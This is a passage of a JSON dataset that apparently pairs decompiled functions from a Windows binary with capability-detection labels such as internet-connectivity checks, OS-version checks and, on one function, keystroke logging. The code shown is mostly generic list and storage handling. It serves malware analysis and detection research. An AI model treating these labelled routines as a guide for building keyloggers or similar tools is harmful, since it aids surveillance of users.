        "decompiled_code": "\nuint fcn.0001e9a8(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong in_stack_00000028;\n    \n    if (*0x7a260 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a260)(arg1, arg2, arg3, arg4, in_stack_00000028);\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 161
    },
    "0001f3c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001f3c8(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong unaff_RDI;\n    ulong noname_3;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong noname_4;\n    ulong in_stack_ffffffffffffffe0;\n    ulong in_stack_ffffffffffffffe8;\n    \n    if (*0x7a1d5 != '\\0') {\n        return 0;\n    }\n    fcn.000313e0(0x7a268);\n    iVar1 = fcn.0001c3a0();\n    if ((iVar1 == 0) && (iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11d70, 0x1ea10),  iVar1 == 0)) {\n        fcn.0005c47c();\n        iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11d50, 0x1eb50);\n        if (iVar1 == 0) {\n            fcn.0005c47c();\n            iVar1 = fcn.0002f718();\n            if (0x22 < iVar1) {\n                iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11d30, 0x1df44);\n                if (iVar1 != 0) goto code_r0x0001f57e;\n                fcn.0005c47c();\n            }\n            iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 73000, 0x1dd50);\n            if (iVar1 == 0) {\n                fcn.0005c47c();\n                noname_3 = 0x1f268;\n                noname_4 = 0x7a1f8;\n                iVar1 = fcn.00052b04(1, *(*0x64080 + 0x10), 0x11bb8, 0x1f268);\n                if (iVar1 == 0) {\n                    fcn.0005c47c(*0x7a1f8);\n                    iVar1 = fcn.00051f30(*0x112d0, 0x1de1c, 0x7a1e8, noname_3, noname_4, in_stack_ffffffffffffffe0, \n                                         in_stack_ffffffffffffffe8, unaff_RDI, unaff_RBX, in_stack_00000000, \n                                         in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                         in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                         in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                         in_stack_00000068, in_stack_00000070);\n                    if (iVar1 == 0) {\n                        fcn.0005c47c(*0x7a1e8);\n                        *0x7a1d5 = 1;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001f57e:\n    fcn.0001db50();\n    return iVar1;\n}\n",
        "token_count": 896
    },
    "0001f58c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001f58c(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong auStackX8 [4];\n    ulong uVar4;\n    \n    if (*0x7a1d6 != '\\0') {\n        return 0;\n    }\n    fcn.00018228();\n    uVar3 = fcn.0002f96c(0x11d18, auStackX8);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar1 = fcn.00052970(1, auStackX8[0], 0x11e38, 0x7a238);\n    uVar3 = uVar1;\n    if (uVar1 == 0) {\n        uVar1 = fcn.00052970(1, auStackX8[0], 0x11e20, 0x7a248);\n        uVar3 = uVar1;\n        if (uVar1 == 0) {\n            uVar1 = fcn.00052970(1, auStackX8[0], 0x11e10, 0x7a240);\n            uVar3 = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.00052970(1, auStackX8[0], 0x11e00, 0x7a220);\n                uVar3 = uVar1;\n                if (uVar1 == 0) {\n                    uVar1 = fcn.00052970(1, auStackX8[0], 0x11df0, 0x7a228);\n                    uVar3 = uVar1;\n                    if (uVar1 == 0) {\n                        uVar1 = fcn.00052970(1, auStackX8[0], 0x11de0, 0x7a230);\n                        uVar3 = uVar1;\n                        if (uVar1 == 0) {\n                            uVar1 = fcn.00052970(1, auStackX8[0], 0x11dd0, 0x7a250);\n                            uVar3 = uVar1;\n                            if (uVar1 == 0) {\n                                uVar1 = fcn.00052970(1, auStackX8[0], 0x11db0, 0x7a260);\n                                uVar3 = uVar1;\n                                if (uVar1 == 0) {\n                                    uVar4 = 0x7a210;\n                                    uVar1 = fcn.00052b04(1, auStackX8[0], 0x11dd0, 0x1f050);\n                                    uVar3 = uVar1;\n                                    if (uVar1 == 0) {\n                                        fcn.0005c47c();\n                                        iVar2 = fcn.0002f718();\n                                        if (0x1a < iVar2) {\n                                            uVar4 = 0x7a208;\n                                            uVar1 = fcn.00052b04(1, auStackX8[0], 0x11d98, 0x1f140);\n                                            uVar3 = uVar1;\n                                            if (uVar1 != 0) goto code_r0x0001f7c7;\n                                            fcn.0005c47c();\n                                        }\n                                        uVar1 = fcn.00052970(1, auStackX8[0], 0x11d80, 0x7a258, uVar4);\n                                        uVar3 = uVar1;\n                                        if (uVar1 == 0) {\n                                            uVar1 = fcn.00052b04(1, auStackX8[0], 0x11d80, 0x1dcb4);\n                                            uVar3 = uVar1;\n                                            if (uVar1 == 0) {\n                                                fcn.0005c47c(*0x7a218);\n                                                *0x7a1d6 = 1;\n                                                return uVar3;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0001f7c7:\n    fcn.0005c47c(*0x7a218);\n    fcn.00052250(0x7a218);\n    fcn.0005c47c(*0x7a208);\n    fcn.00052250(0x7a208);\n    fcn.0005c47c(*0x7a210);\n    fcn.00052250(0x7a210);\n    return uVar3;\n}\n",
        "token_count": 1042
    },
    "0001fd9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001fd9c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg1 != 0) {\n        iVar2 = *(arg1 + 0x38);\n        while (iVar2 != 0) {\n            iVar2 = *(*(arg1 + 0x38) + 0x10);\n            while (iVar2 != 0) {\n                if (*(iVar2 + 0x20) == 0) {\n                    *(arg1 + 0x40) = *(iVar2 + 0x28);\n                }\n                else {\n                    *(*(iVar2 + 0x20) + 0x28) = *(iVar2 + 0x28);\n                }\n                if (*(iVar2 + 0x28) == 0) {\n                    *(arg1 + 0x48) = *(iVar2 + 0x20);\n                }\n                else {\n                    *(*(iVar2 + 0x28) + 0x20) = *(iVar2 + 0x20);\n                }\n                iVar1 = *(iVar2 + 0x18);\n                fcn.0002fc50(iVar2);\n                iVar2 = iVar1;\n            }\n            iVar2 = *(arg1 + 0x38);\n            *(arg1 + 0x38) = *(iVar2 + 0x20);\n            fcn.0002fc50(iVar2);\n            iVar2 = *(arg1 + 0x38);\n        }\n        *(arg1 + 0x38) = 0;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "0001feb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001feb8(ulong *arg1)\n\n{\n    fcn.0002f458(*arg1);\n    if (*(arg1 + 1) != 0) {\n        fcn.0002f2a4(0x88cc0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0001fee4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001fee4(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uint *arg1_00;\n    uint32_t *puVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    if (arg1 != 0) {\n        arg1_00 = fcn.0002fbc4(0x38);\n        if (arg1_00 == NULL) {\n            return 2;\n        }\n        *arg1_00 = arg4;\n        arg1_00[3] = in_stack_00000030;\n        arg1_00[1] = in_stack_00000038;\n        arg1_00[2] = in_stack_00000028;\n        for (puVar3 = *(arg1 + 0x38); (puVar3 != NULL && ((*puVar3 != arg2 || (puVar3[1] != arg3))));\n            puVar3 = *(puVar3 + 8)) {\n        }\n        if ((puVar3 != NULL) || (puVar3 = fcn.0001fe20(arg1, arg2, arg3, 0),  puVar3 != NULL)) {\n            if (*(puVar3 + 4) == 0) {\n                *(arg1_00 + 6) = 0;\n                *(arg1_00 + 4) = 0;\n                *(puVar3 + 4) = arg1_00;\n            }\n            else {\n                iVar1 = *(puVar3 + 6);\n                *(iVar1 + 0x18) = arg1_00;\n                *(arg1_00 + 6) = 0;\n                *(arg1_00 + 4) = iVar1;\n            }\n            *(puVar3 + 6) = arg1_00;\n            if (*(arg1 + 0x40) == 0) {\n                *(arg1_00 + 8) = 0;\n                *(arg1_00 + 10) = 0;\n                *(arg1 + 0x40) = arg1_00;\n            }\n            else {\n                *(*(arg1 + 0x48) + 0x28) = arg1_00;\n                uVar2 = *(arg1 + 0x48);\n                *(arg1_00 + 10) = 0;\n                *(arg1_00 + 8) = uVar2;\n            }\n            *(arg1 + 0x48) = arg1_00;\n            *(arg1_00 + 0xc) = puVar3;\n            return 0;\n        }\n        fcn.0002fc50(arg1_00);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 621
    },
    "00020860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00020860(ulong arg1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t arg1_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t aiStackX16 [3];\n    uchar auStack328 [16];\n    uchar auStack312 [8];\n    int32_t iStack304;\n    int32_t iStack268;\n    uchar auStack248 [8];\n    int32_t iStack240;\n    int32_t iStack204;\n    uchar auStack184 [48];\n    uchar auStack136 [72];\n    \n    iVar2 = fcn.00020640(aiStackX16, arg1, 1, auStack328);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.000619f6(auStack184, aiStackX16[0] + 8, 0x2c);\n    if (*(aiStackX16[0] + 0x20) == 0) {\n        uVar3 = *(aiStackX16[0] + 0xc);\n        if (uVar3 < *(aiStackX16[0] + 0x1c)) {\n            uVar3 = (*(aiStackX16[0] + 0x14) - *(aiStackX16[0] + 0xc)) + -1 + *(aiStackX16[0] + 0x1c);\ncode_r0x00020ad8:\n            uVar3 = (uVar3 / *(aiStackX16[0] + 0x14)) * *(aiStackX16[0] + 0x14) + *(aiStackX16[0] + 0xc);\n        }\n    }\n    else {\n        (**(*(aiStackX16[0] + 0x58) + 0x38))(*(aiStackX16[0] + 0x60), 2);\n        uVar3 = 0x2c;\n        iVar5 = 0;\n        iVar2 = 0;\n        if (0x2c < *(aiStackX16[0] + 0x1c)) {\n            do {\n                iVar5 = iVar2;\n                iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack312, 0x40, uVar3);\n                if (iVar2 != 0) goto code_r0x00020af3;\n                uVar1 = iStack268 + 0x40 + uVar3;\n                if (uVar1 <= uVar3) break;\n                if (iStack304 == 0xffff) {\n                    if (*(aiStackX16[0] + 0x1c) <= uVar1) break;\n                    iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack248, 0x40, uVar1);\n                    if (iVar2 != 0) goto code_r0x00020af3;\n                    uVar4 = iStack204 + 0x40;\n                    if (iStack240 == 0xffff) {\n                        iStack268 = iStack268 + uVar4;\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), auStack312);\n                        if (iVar2 != 0) goto code_r0x00020af3;\n                    }\n                    else {\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), auStack136, 0x40);\n                        if ((iVar2 != 0) || (arg1_00 = fcn.0002fbc4(uVar4),  arg1_00 == 0)) goto code_r0x00020af3;\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x28))(*(aiStackX16[0] + 0x60), arg1_00, uVar4, uVar1);\n                        if ((iVar2 != 0) ||\n                           (iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), arg1_00, uVar4, uVar3)\n                           ,  iVar2 != 0)) {\n                            fcn.0002fc50(arg1_00);\n                            goto code_r0x00020af3;\n                        }\n                        fcn.0002fc50(arg1_00);\n                        iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), auStack136, 0x40);\n                        if (iVar2 != 0) break;\n                    }\n                }\n                else {\n                    iVar5 = iVar5 + 1;\n                    uVar3 = uVar1;\n                }\n                iVar2 = iVar5;\n            } while (uVar3 < *(aiStackX16[0] + 0x1c));\n        }\n        *(aiStackX16[0] + 0x1c) = uVar3;\n        *(aiStackX16[0] + 0x18) = iVar5;\n        *(aiStackX16[0] + 0x20) = 0;\n        iVar2 = fcn.00061a80(aiStackX16[0] + 8, auStack184, 0x2c, 1, 1);\n        if (iVar2 != 0) {\n            *(aiStackX16[0] + 0x2c) = *(aiStackX16[0] + 0x2c) + 1;\n            iVar2 = (**(*(aiStackX16[0] + 0x58) + 0x30))(*(aiStackX16[0] + 0x60), aiStackX16[0] + 8, 0x2c);\n            if (iVar2 != 0) {\n                fcn.0001fd9c(aiStackX16[0]);\n                goto code_r0x00020af3;\n            }\n        }\n        fcn.00020184(aiStackX16[0]);\n        uVar3 = *(aiStackX16[0] + 0xc);\n        if (uVar3 < *(aiStackX16[0] + 0x1c)) {\n            uVar3 = (*(aiStackX16[0] + 0x14) - *(aiStackX16[0] + 0xc)) + -1 + *(aiStackX16[0] + 0x1c);\n            goto code_r0x00020ad8;\n        }\n    }\n    if (uVar3 != *(aiStackX16[0] + 8)) {\n        fcn.00020380(aiStackX16[0], uVar3);\n    }\ncode_r0x00020af3:\n    (**(*(aiStackX16[0] + 0x58) + 0x38))(*(aiStackX16[0] + 0x60), 1);\n    fcn.0001feb8(auStack328);\n    return;\n}\n",
        "token_count": 1656
    },
    "00020d04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00020d04(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    int32_t *arg2_00;\n    int64_t iStack72;\n    uchar auStack64 [24];\n    \n    uVar2 = fcn.00020640(&iStack72, arg1, 1, auStack64);\n    if (uVar2 == 0) {\n        if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n            arg2._0_4_ = *(iStack72 + 0x98);\n        }\n        for (arg2_00 = *(iStack72 + 0x38); (arg2_00 != NULL && ((*arg2_00 != arg2 || (arg2_00[1] != arg3))));\n            arg2_00 = *(arg2_00 + 8)) {\n        }\n        fcn.00020034(iStack72, arg2_00, arg4, 1);\n        if ((-1 < *(iStack72 + 0x68)) &&\n           (((uVar1 = *(iStack72 + 0x20),  1 < uVar1 && (*(iStack72 + 0x18) <= uVar1 && uVar1 != *(iStack72 + 0x18))) ||\n            ((*(iStack72 + 0x10) >> 10) / 100 < uVar1)))) {\n            fcn.00020860(arg1);\n        }\n        fcn.0001feb8(auStack64);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 384
    },
    "00020dc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00020dc8(ulong arg1, int32_t *arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t *arg2_00;\n    int64_t iStackX32;\n    uchar auStack56 [16];\n    \n    arg3 = arg3 & 0xffffffff;\n    uVar2 = fcn.00020640(&iStackX32, arg1, 1, auStack56);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    if (arg3 != 0) {\n        iVar3 = *arg2;\n        if ((*(iStackX32 + 0x90) != 0) && (iVar3 == *(iStackX32 + 0x94))) {\n            iVar3 = *(iStackX32 + 0x98);\n        }\n        for (arg2_00 = *(iStackX32 + 0x38); (arg2_00 != NULL && ((*arg2_00 != iVar3 || (arg2_00[1] != arg2[2]))));\n            arg2_00 = *(arg2_00 + 8)) {\n        }\n        if (arg3 != 0) {\n            puVar4 = arg2 + 1;\n            do {\n                if (*puVar4 != 0xffffffff) {\n                    fcn.00020034(iStackX32, arg2_00, *puVar4, 2);\n                }\n                puVar4 = puVar4 + 0x10;\n                arg3 = arg3 - 1;\n            } while (arg3 != 0);\n        }\n        fcn.0001fe7c(arg2_00);\n        *(iStackX32 + 0x2c) = *(iStackX32 + 0x2c) + 1;\n        uVar1 = (**(*(iStackX32 + 0x58) + 0x30))();\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x00020ec2;\n        if ((-1 < *(iStackX32 + 0x68)) &&\n           (((uVar1 = *(iStackX32 + 0x20),  1 < uVar1 && (*(iStackX32 + 0x18) <= uVar1 && uVar1 != *(iStackX32 + 0x18)))\n            || ((*(iStackX32 + 0x10) >> 10) / 100 < uVar1)))) {\n            fcn.00020860(arg1);\n        }\n    }\n    uVar2 = 0;\ncode_r0x00020ec2:\n    fcn.0001feb8(auStack56);\n    return uVar2;\n}\n",
        "token_count": 634
    },
    "0002105c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0002105c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint32_t *in_stack_00000040;\n    int64_t iStack136;\n    uchar auStack128 [24];\n    uchar auStack104 [36];\n    uint uStack68;\n    int32_t iStack60;\n    \n    if ((in_stack_00000030 == 0) || (in_stack_00000040 == NULL)) {\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar3 = fcn.00020640(&iStack136, arg1, 0, auStack128);\n        if (uVar3 == 0) {\n            if ((*(iStack136 + 0x90) != 0) && (arg2 == *(iStack136 + 0x94))) {\n                arg2._0_4_ = *(iStack136 + 0x98);\n            }\n            for (arg1_00 = *(iStack136 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n                arg1_00 = *(arg1_00 + 8)) {\n            }\n            uVar1 = fcn.00020000(arg1_00, arg4);\n            if (uVar1 == 0xffffffff) {\n                uVar1 = 5;\n            }\n            else {\n                uVar3 = uVar1;\n                (**(*(iStack136 + 0x58) + 0x28))(*(iStack136 + 0x60), auStack104, 0x40, uVar3);\n                uStack68 = fcn.00030130(0);\n                (**(*(iStack136 + 0x58) + 0x30))(*(iStack136 + 0x60), auStack104, 0x40, uVar3);\n                if (iStack60 - in_stack_00000028 < in_stack_00000038) {\n                    in_stack_00000038 = iStack60 - in_stack_00000028;\n                }\n                *in_stack_00000040 = in_stack_00000038;\n                iVar2 = (**(*(iStack136 + 0x58) + 0x28))\n                                  (*(iStack136 + 0x60), in_stack_00000030, in_stack_00000038, \n                                   in_stack_00000028 + 0x40 + uVar3);\n                uVar1 = -(iVar2 != 0) & 3;\n            }\n            fcn.0001feb8(auStack128);\n            uVar3 = uVar1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 664
    },
    "000211a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000211a0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t *arg1_00;\n    uint32_t uVar4;\n    uint32_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    int64_t iStack152;\n    uchar auStack144 [24];\n    uchar auStack120 [40];\n    uint uStack80;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    \n    if ((in_stack_00000030 == 0) && (in_stack_00000038 != 0)) {\n        return 0xffffffff;\n    }\n    uVar4 = 5;\n    uVar3 = fcn.00020640(&iStack152, arg1, 5, auStack144);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    if ((*(iStack152 + 0x90) != 0) && (arg2 == *(iStack152 + 0x94))) {\n        arg2._0_4_ = *(iStack152 + 0x98);\n    }\n    for (arg1_00 = *(iStack152 + 0x38); (arg1_00 != NULL && ((*arg1_00 != arg2 || (arg1_00[1] != arg3))));\n        arg1_00 = *(arg1_00 + 8)) {\n    }\n    uVar1 = fcn.00020000(arg1_00, arg4);\n    if (uVar1 == 0xffffffff) goto code_r0x000212d8;\n    uVar3 = uVar1;\n    iVar2 = (**(*(iStack152 + 0x58) + 0x28))(*(iStack152 + 0x60), auStack120, 0x40, uVar3);\n    if (iVar2 == 0) {\n        uVar4 = in_stack_00000028 + in_stack_00000038;\n        if (uStack76 < uVar4) {\n            uVar4 = 6;\n            goto code_r0x000212d8;\n        }\n        uStack80 = fcn.00030130(0);\n        if (uStack72 < uVar4) {\n            uStack72 = uVar4;\n        }\n        iVar2 = (**(*(iStack152 + 0x58) + 0x30))\n                          (*(iStack152 + 0x60), in_stack_00000030, in_stack_00000038, in_stack_00000028 + 0x40 + uVar3);\n        if (iVar2 == 0) {\n            iVar2 = (**(*(iStack152 + 0x58) + 0x30))(*(iStack152 + 0x60), auStack120, 0x40, uVar3);\n            uVar4 = -(iVar2 != 0) & 3;\n            goto code_r0x000212d8;\n        }\n    }\n    uVar4 = 3;\ncode_r0x000212d8:\n    fcn.0001feb8(auStack144);\n    return uVar4;\n}\n",
        "token_count": 732
    },
    "000213c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000213c0(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t in_stack_00000028;\n    int64_t iStack72;\n    uchar auStack64 [32];\n    \n    if (in_stack_00000028 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.00020640(&iStack72, arg1, 0, auStack64);\n        if (uVar2 == 0) {\n            if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n                arg2._0_4_ = *(iStack72 + 0x98);\n            }\n            uVar5 = 5;\n            for (piVar3 = *(iStack72 + 0x38); (piVar3 != NULL && ((*piVar3 != arg2 || (piVar3[1] != arg3))));\n                piVar3 = *(piVar3 + 8)) {\n            }\n            if (piVar3 != NULL) {\n                for (iVar4 = *(piVar3 + 4); iVar4 != 0; iVar4 = *(iVar4 + 0x18)) {\n                    if ((arg4 == NULL) || (*(iVar4 + 8) == *arg4)) {\n                        iVar1 = (**(*(iStack72 + 0x58) + 0x28))\n                                          (*(iStack72 + 0x60), in_stack_00000028, 0x40, *(iVar4 + 0xc));\n                        uVar5 = -(iVar1 != 0) & 5;\n                        break;\n                    }\n                }\n            }\n            fcn.0001feb8(auStack64);\n            uVar2 = uVar5;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 460
    },
    "00021498": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.00021498(ulong arg1, ulong arg2, ulong arg3, uint32_t *arg4, int64_t *noname_4, ulong noname_5, ulong noname_6\n                  , ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, ulong noname_12, \n                  ulong noname_13, ulong noname_14, ulong noname_15, ulong arg_90h, ulong arg_98h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    int64_t iVar5;\n    int64_t iStackX32;\n    ulong var_38h;\n    ulong var_58h;\n    ulong var_60h;\n    uchar auStack72 [24];\n    \n    if (arg4 == NULL) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.00020640(&iStackX32, arg1, 0, auStack72);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    if ((*(iStackX32 + 0x90) != 0) && (arg2 == *(iStackX32 + 0x94))) {\n        arg2._0_4_ = *(iStackX32 + 0x98);\n    }\n    if (noname_4 != NULL) {\n        *noname_4 = 0;\n    }\n    *arg4 = 0;\n    for (piVar4 = *(iStackX32 + 0x38); (piVar4 != NULL && ((*piVar4 != arg2 || (piVar4[1] != arg3))));\n        piVar4 = *(piVar4 + 8)) {\n    }\n    if (piVar4 != NULL) {\n        for (iVar3 = *(piVar4 + 4); iVar3 != 0; iVar3 = *(iVar3 + 0x18)) {\n            *arg4 = *arg4 + 1;\n        }\n        if ((noname_4 != NULL) && (*arg4 != 0)) {\n            iVar3 = fcn.0002fbc4(*arg4 << 6);\n            *noname_4 = iVar3;\n            if (iVar3 == 0) {\ncode_r0x0002156e:\n                uVar2 = 2;\n                goto code_r0x00021638;\n            }\n            if (((*arg4 < 2) || (**(iStackX32 + 0x58) < 0x41)) || ((*(iStackX32 + 0x58))[8] == 0)) {\n                *arg4 = 0;\n                for (iVar3 = *(piVar4 + 4); iVar3 != 0; iVar3 = *(iVar3 + 0x18)) {\n                    iVar1 = (**(*(iStackX32 + 0x58) + 0x28))\n                                      (*(iStackX32 + 0x60), *arg4 * 0x40 + *noname_4, 0x40, *(iVar3 + 0xc));\n                    if (iVar1 == -1) goto code_r0x0002161a;\n                    *arg4 = *arg4 + 1;\n                }\n            }\n            else {\n                iVar3 = fcn.0002fc18(*arg4);\n                if (iVar3 == 0) goto code_r0x0002156e;\n                *arg4 = 0;\n                for (iVar5 = *(piVar4 + 4); iVar5 != 0; iVar5 = *(iVar5 + 0x18)) {\n                    *(iVar3 + *arg4 * 0x18) = *arg4 * 0x40 + *noname_4;\n                    *(iVar3 + 8 + *arg4 * 0x18) = *(iVar5 + 0xc);\n                    *(iVar3 + 0x10 + *arg4 * 0x18) = 0x40;\n                    *arg4 = *arg4 + 1;\n                }\n                iVar1 = (**(*(iStackX32 + 0x58) + 0x40))(*(iStackX32 + 0x60), iVar3, *arg4);\n                if (iVar1 != 0) {\n                    fcn.0002fc50(iVar3);\ncode_r0x0002161a:\n                    uVar2 = 3;\n                    fcn.0002fc50(*noname_4);\n                    *noname_4 = 0;\n                    *arg4 = 0;\n                    goto code_r0x00021638;\n                }\n                fcn.0002fc50(iVar3);\n            }\n        }\n    }\n    uVar2 = 0;\ncode_r0x00021638:\n    fcn.0001feb8(auStack72);\n    return uVar2;\n}\n",
        "token_count": 1087
    },
    "00021a18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
